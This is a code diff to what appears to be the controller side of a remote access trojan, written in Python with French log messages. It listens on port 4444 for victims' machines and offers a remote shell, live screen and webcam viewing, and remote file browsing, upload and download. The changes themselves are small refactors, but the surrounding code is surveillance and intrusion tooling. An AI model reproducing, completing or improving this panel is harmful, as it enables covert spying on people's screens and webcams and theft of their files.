@@ -6,8 +6,8 @@ import base64
 from PIL import Image, ImageTk
 import customtkinter as ctk
 from tkinter import ttk, filedialog
-from protocol import send_data, receive_data, receive_base64
 from tkinter import Menu
+from protocol import send_data, receive_data, receive_base64
 
 HOST = "0.0.0.0"
 PORT = 4444
@@ -40,7 +40,7 @@ class StreamingWindow(ctk.CTkToplevel):
                 if not data or len(data) < 1000:
                     continue
                 img = Image.open(io.BytesIO(data)).resize((self.stream_w, self.stream_h))
-                photo = ctk.CTkImage(light_image=img, dark_image=img, size=(self.stream_w, self.stream_h))
+                photo = ImageTk.PhotoImage(img)
                 self.image_label.configure(image=photo)
                 self.image_label.image = photo
             except Exception as e:
@@ -65,7 +65,7 @@ class WebcamWindow(ctk.CTkToplevel):
         data = self.receive_base64()
         try:
             img = Image.open(io.BytesIO(data)).resize((580, 400))
-            photo = ctk.CTkImage(light_image=img, dark_image=img, size=(self.stream_w, self.stream_h))
+            photo = ImageTk.PhotoImage(img)
             self.image_label.configure(image=photo)
             self.image_label.image = photo
         except Exception as e:
@@ -103,6 +103,7 @@ class ToolsWindow(ctk.CTk):
 
     def wait_for_connection(self):
         self.log("[*] En attente de connexions...")
+
         sock_cmd = socket.socket()
         sock_cmd.bind((HOST, PORT))
         sock_cmd.listen(1)
@@ -114,6 +115,7 @@ class ToolsWindow(ctk.CTk):
         sock_video.listen(1)
         self.video_socket, _ = sock_video.accept()
         self.log("[+] Client vidéo connecté")
+
         self.after(100, self.setup_files_tab)
 
     def setup_shell_tab(self):
@@ -192,14 +194,15 @@ class ToolsWindow(ctk.CTk):
             entries = self.receive_data().decode().splitlines()
             for entry in entries:
                 if "|" not in entry:
-                    continue  # ignore les lignes malformées
+                    continue
                 try:
                     name, entry_type = entry.split("|", 1)
                     full_path = os.path.join(path, name).replace("\\", "/")
                     self.tree.insert(item, "end", text=name, values=[full_path], tags=(entry_type,))
                 except Exception as e:
                     self.log(f"[Erreur parsing fichier] {entry} → {e}")
-
+        else:
+            self.modify_file(path)
 
     def on_right_click(self, event):
         try:
@@ -243,14 +246,12 @@ class ToolsWindow(ctk.CTk):
             if remote_path.endswith("/") or remote_path[-1] in ["/", "\\"]:
                 filename = os.path.basename(file_path)
                 remote_path = os.path.join(remote_path, filename).replace("\\", "/")
-            self.log(f"[DEBUG] Upload vers {remote_path} ({len(content)} octets)")
             self.send_command(f"writefile {remote_path}")
-            send_data(self.client_socket, content.encode())  # Envoie séparée
+            send_data(self.client_socket, content.encode())
             result = self.receive_data().decode()
             self.log(f"[Upload] {result}")
         except Exception as e:
             self.log(f"[Erreur upload] {e}")
-
 
     def download_file(self, path):
         self.send_command(f"readfile {path}")
@@ -262,7 +263,7 @@ class ToolsWindow(ctk.CTk):
             with open(local_path, "wb") as f:
                 f.write(base64.b64decode(content))
             self.log(f"[Téléchargé] {filename}")
-            os.startfile(local_path)  # Windows seulement
+            os.startfile(local_path)
         except Exception as e:
             self.log(f"Erreur téléchargement: {e}")
 
@@ -304,7 +305,7 @@ class ToolsWindow(ctk.CTk):
 
     def send_command(self, cmd):
         try:
-            send_data(self.client_socket, cmd)
+            self.client_socket.send(cmd.encode())
         except:
             self.log("[-] Échec envoi commande")
 
